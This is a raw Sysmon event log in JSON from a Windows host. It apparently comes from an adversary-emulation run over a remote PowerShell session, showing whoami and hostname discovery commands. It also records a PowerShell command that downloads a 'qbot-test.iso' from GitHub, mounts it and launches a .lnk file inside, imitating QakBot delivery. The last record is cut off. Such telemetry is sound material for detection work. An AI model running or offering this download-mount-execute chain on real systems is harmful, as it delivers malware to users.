{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:32.2561741"},"EventRecordID":"17958","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:32.250"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38c-671b-cb00-000000003900"},{"@Name":"ProcessId","#text":"2340"},{"@Name":"Image","#text":"C:\\Windows\\System32\\whoami.exe"},{"@Name":"FileVersion","#text":"10.0.19041.1 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"whoami - displays logged on user information"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"whoami.exe"},{"@Name":"CommandLine","#text":"\"C:\\Windows\\system32\\whoami.exe\""},{"@Name":"CurrentDirectory","#text":"C:\\Users\\admin_test\\Documents\\"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-e388-671b-6c50-110000000000"},{"@Name":"LogonId","#text":"0x11506C"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-e388-671b-b700-000000003900"},{"@Name":"ParentProcessId","#text":"1132"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\wsmprovhost.exe"},{"@Name":"ParentCommandLine","#text":"C:\\Windows\\system32\\wsmprovhost.exe -Embedding"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:32.2735917"},"EventRecordID":"17959","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:32.270"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38c-671b-cc00-000000003900"},{"@Name":"ProcessId","#text":"2312"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Console Window Host"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"CONHOST.EXE"},{"@Name":"CommandLine","#text":"\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"},{"@Name":"CurrentDirectory","#text":"C:\\Windows"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-e388-671b-6c50-110000000000"},{"@Name":"LogonId","#text":"0x11506C"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=CC0A60CD15FA21E54615E46CD0F10CFBE86F496DC64D14B31D9F3B415D120EE1"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-e38c-671b-cb00-000000003900"},{"@Name":"ParentProcessId","#text":"2340"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\whoami.exe"},{"@Name":"ParentCommandLine","#text":"\"C:\\Windows\\system32\\whoami.exe\""},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:32.3465567"},"EventRecordID":"17960","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:32.345"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38c-671b-cb00-000000003900"},{"@Name":"ProcessId","#text":"2340"},{"@Name":"Image","#text":"C:\\Windows\\System32\\whoami.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:32.3508791"},"EventRecordID":"17961","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:32.346"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38c-671b-cc00-000000003900"},{"@Name":"ProcessId","#text":"2312"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}



{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:32.6644091"},"EventRecordID":"17965","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:32.647"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38c-671b-d200-000000003900"},{"@Name":"ProcessId","#text":"5756"},{"@Name":"Image","#text":"C:\\Program Files\\RUXIM\\RUXIMICS.exe"},{"@Name":"FileVersion","#text":"10.0.19041.5067 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Reusable UX Interaction Manager"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"RUXIMICS.exe"},{"@Name":"CommandLine","#text":"%%ProgramFiles%%\\RUXIM\\RUXIMICS.EXE /onlyloadcampaigns"},{"@Name":"CurrentDirectory","#text":"C:\\Program Files\\RUXIM\\"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"},{"@Name":"LogonGuid","#text":"dbf410b3-ff14-671b-e703-000000000000"},{"@Name":"LogonId","#text":"0x3E7"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"System"},{"@Name":"Hashes","#text":"SHA256=3BDD8C774071B82A08629F271D14A8FB0C096A3C279E797377E034B03A217949"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-e38c-671b-c900-000000003900"},{"@Name":"ParentProcessId","#text":"2136"},{"@Name":"ParentImage","#text":"C:\\Program Files\\RUXIM\\PLUGScheduler.exe"},{"@Name":"ParentCommandLine","#text":"\"C:\\Program Files\\RUXIM\\PLUGscheduler.exe\""},{"@Name":"ParentUser","#text":"NT AUTHORITY\\SYSTEM"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:32.6644325"},"EventRecordID":"17966","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:32.660"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38c-671b-d100-000000003900"},{"@Name":"ProcessId","#text":"4692"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}







{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:33.0799483"},"EventRecordID":"17984","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:33.075"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38d-671b-db00-000000003900"},{"@Name":"ProcessId","#text":"6132"},{"@Name":"Image","#text":"C:\\Windows\\System32\\HOSTNAME.EXE"},{"@Name":"FileVersion","#text":"10.0.19041.1 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Hostname APP"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"hostname.exe"},{"@Name":"CommandLine","#text":"\"C:\\Windows\\system32\\HOSTNAME.EXE\""},{"@Name":"CurrentDirectory","#text":"C:\\Users\\admin_test\\Documents\\"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-e388-671b-6c50-110000000000"},{"@Name":"LogonId","#text":"0x11506C"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-e388-671b-b700-000000003900"},{"@Name":"ParentProcessId","#text":"1132"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\wsmprovhost.exe"},{"@Name":"ParentCommandLine","#text":"C:\\Windows\\system32\\wsmprovhost.exe -Embedding"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:33.0846771"},"EventRecordID":"17985","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:33.082"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38d-671b-dc00-000000003900"},{"@Name":"ProcessId","#text":"2204"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Console Window Host"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"CONHOST.EXE"},{"@Name":"CommandLine","#text":"\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"},{"@Name":"CurrentDirectory","#text":"C:\\Windows"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-e388-671b-6c50-110000000000"},{"@Name":"LogonId","#text":"0x11506C"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=CC0A60CD15FA21E54615E46CD0F10CFBE86F496DC64D14B31D9F3B415D120EE1"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-e38d-671b-db00-000000003900"},{"@Name":"ParentProcessId","#text":"6132"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\HOSTNAME.EXE"},{"@Name":"ParentCommandLine","#text":"\"C:\\Windows\\system32\\HOSTNAME.EXE\""},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:33.1262996"},"EventRecordID":"17986","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:33.122"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38d-671b-db00-000000003900"},{"@Name":"ProcessId","#text":"6132"},{"@Name":"Image","#text":"C:\\Windows\\System32\\HOSTNAME.EXE"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:33.1296550"},"EventRecordID":"17987","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:33.127"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38d-671b-dc00-000000003900"},{"@Name":"ProcessId","#text":"2204"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:33.1332356"},"EventRecordID":"17988","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:33.129"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38d-671b-dd00-000000003900"},{"@Name":"ProcessId","#text":"2500"},{"@Name":"Image","#text":"C:\\Windows\\System32\\whoami.exe"},{"@Name":"FileVersion","#text":"10.0.19041.1 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"whoami - displays logged on user information"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"whoami.exe"},{"@Name":"CommandLine","#text":"\"C:\\Windows\\system32\\whoami.exe\""},{"@Name":"CurrentDirectory","#text":"C:\\Users\\admin_test\\Documents\\"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-e388-671b-6c50-110000000000"},{"@Name":"LogonId","#text":"0x11506C"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-e388-671b-b700-000000003900"},{"@Name":"ParentProcessId","#text":"1132"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\wsmprovhost.exe"},{"@Name":"ParentCommandLine","#text":"C:\\Windows\\system32\\wsmprovhost.exe -Embedding"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:33.1409310"},"EventRecordID":"17989","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:33.136"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38d-671b-de00-000000003900"},{"@Name":"ProcessId","#text":"6856"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Console Window Host"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"CONHOST.EXE"},{"@Name":"CommandLine","#text":"\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"},{"@Name":"CurrentDirectory","#text":"C:\\Windows"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-e388-671b-6c50-110000000000"},{"@Name":"LogonId","#text":"0x11506C"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=CC0A60CD15FA21E54615E46CD0F10CFBE86F496DC64D14B31D9F3B415D120EE1"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-e38d-671b-dd00-000000003900"},{"@Name":"ParentProcessId","#text":"2500"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\whoami.exe"},{"@Name":"ParentCommandLine","#text":"\"C:\\Windows\\system32\\whoami.exe\""},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:33.1854137"},"EventRecordID":"17990","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:33.184"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38d-671b-dd00-000000003900"},{"@Name":"ProcessId","#text":"2500"},{"@Name":"Image","#text":"C:\\Windows\\System32\\whoami.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:33.1878475"},"EventRecordID":"17991","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:33.186"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38d-671b-de00-000000003900"},{"@Name":"ProcessId","#text":"6856"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:33.4443659"},"EventRecordID":"17992","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:33.419"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38d-671b-df00-000000003900"},{"@Name":"ProcessId","#text":"2704"},{"@Name":"Image","#text":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},{"@Name":"FileVersion","#text":"10.0.19041.3996 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Windows PowerShell"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"PowerShell.EXE"},{"@Name":"CommandLine","#text":"\"powershell.exe\" &amp; {IEX (iwr \\\"\"https://raw.githubusercontent.com/file/file-file/master/files/data.003/src/qbot-test.iso\\\"\" -OutFile \\\"\"$env:TEMP\\qbot-test.iso\\\"\"), Mount-DiskImage -ImagePath \\\"\"$env:TEMP\\qbot-test.iso\\\"\", $mountedpath = (Get-DiskImage -ImagePath \\\"\"$env:TEMP\\qbot-test.iso\\\"\" | Get-Volume).DriveLetter, $finalpath = $mountedpath + \\\"\":\\\\\"\", cd $finalpath, .\\calc.exe.lnk}"},{"@Name":"CurrentDirectory","#text":"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-e388-671b-6c50-110000000000"},{"@Name":"LogonId","#text":"0x11506C"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-e388-671b-b700-000000003900"},{"@Name":"ParentProcessId","#text":"1132"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\wsmprovhost.exe"},{"@Name":"ParentCommandLine","#text":"C:\\Windows\\system32\\wsmprovhost.exe -Embedding"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:33.4877610"},"EventRecordID":"17993","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:32.491"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38c-671b-cf00-000000003900"},{"@Name":"ProcessId","#text":"4644"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Console Window Host"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"CONHOST.EXE"},{"@Name":"CommandLine","#text":"\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"},{"@Name":"CurrentDirectory","#text":"C:\\Windows"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"},{"@Name":"LogonGuid","#text":"dbf410b3-ff14-671b-e703-000000000000"},{"@Name":"LogonId","#text":"0x3E7"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"System"},{"@Name":"Hashes","#text":"SHA256=CC0A60CD15FA21E54615E46CD0F10CFBE86F496DC64D14B31D9F3B415D120EE1"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-e38c-671b-c300-000000003900"},{"@Name":"ParentProcessId","#text":"3280"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\sc.exe"},{"@Name":"ParentCommandLine","#text":"\"C:\\Windows\\system32\\sc.exe\" start pushtoinstall registration"},{"@Name":"ParentUser","#text":"NT AUTHORITY\\SYSTEM"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:33.5457017"},"EventRecordID":"17994","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:33.542"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38d-671b-e000-000000003900"},{"@Name":"ProcessId","#text":"3892"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Console Window Host"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"CONHOST.EXE"},{"@Name":"CommandLine","#text":"\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"},{"@Name":"CurrentDirectory","#text":"C:\\Windows"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-e388-671b-6c50-110000000000"},{"@Name":"LogonId","#text":"0x11506C"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=CC0A60CD15FA21E54615E46CD0F10CFBE86F496DC64D14B31D9F3B415D120EE1"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-e38d-671b-df00-000000003900"},{"@Name":"ParentProcessId","#text":"2704"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},{"@Name":"ParentCommandLine","#text":"\"powershell.exe\" &amp; {IEX (iwr \\\"\"https://raw.githubusercontent.com/file/file-file/master/files/data.003/src/qbot-test.iso\\\"\" -OutFile \\\"\"$env:TEMP\\qbot-test.iso\\\"\"), Mount-DiskImage -ImagePath \\\"\"$env:TEMP\\qbot-test.iso\\\"\", $mountedpath = (Get-DiskImage -ImagePath \\\"\"$env:TEMP\\qbot-test.iso\\\"\" | Get-Volume).DriveLetter, $finalpath = $mountedpath + \\\"\":\\\\\"\", cd $finalpath, .\\calc.exe.lnk}"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:33.8437102"},"EventRecordID":"17995","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:32.449"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38c-671b-cd00-000000003900"},{"@Name":"ProcessId","#text":"4184"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Console Window Host"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"CONHOST.EXE"},{"@Name":"CommandLine","#text":"\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"},{"@Name":"CurrentDirectory","#text":"C:\\Windows"},{"@Name":"User","#text":"NT 